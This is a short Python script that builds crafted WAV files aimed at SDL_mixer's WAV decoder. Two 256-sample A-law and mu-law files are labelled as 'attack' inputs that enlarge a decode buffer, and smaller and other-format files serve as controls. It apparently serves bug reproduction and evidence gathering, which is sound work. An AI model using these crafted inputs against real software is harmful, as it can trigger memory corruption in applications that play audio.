#!/usr/bin/env python3
"""Craft minimal RIFF/WAVE files for the real SDL_mixer WAV decoder."""
import struct
import sys
from pathlib import Path

OUT = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).parent / "evidence"


def wav(path, tag, data, *, channels=1, rate=8000, bits=8, blockalign=1):
    fmt = struct.pack("<HHIIHH", tag, channels, rate, rate * blockalign, blockalign, bits)
    body = b"WAVE" + b"fmt " + struct.pack("<I", len(fmt)) + fmt
    body += b"data" + struct.pack("<I", len(data)) + data
    path.write_bytes(b"RIFF" + struct.pack("<I", len(body)) + body)


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    # Deterministic payload bytes; 0x55 avoids all-zero/-one special cases.
    payload = bytes((0x55 + (i & 0x3F)) & 0xFF for i in range(256))
    cases = {
        "alaw256.wav": (6, payload),       # attack: 256 samples -> buflen 1024
        "ulaw256.wav": (7, payload),       # attack: mu-law sibling
        "alaw8.wav": (6, payload[:8]),     # safe: 8 samples -> buflen 32
        "pcm8_256.wav": (1, payload),      # negative control: FetchPCM
        "badfmt_256.wav": (0x1234, payload),  # negative control: parser rejects
    }
    for name, (tag, data) in cases.items():
        wav(OUT / name, tag, data)
        print(f"{name}: tag={tag} data={len(data)} bytes size={(OUT / name).stat().st_size}")
    import hashlib
    for name in cases:
        blob = (OUT / name).read_bytes()
        print(f"{name} sha256 {hashlib.sha256(blob).hexdigest()}")


if __name__ == "__main__":
    main()
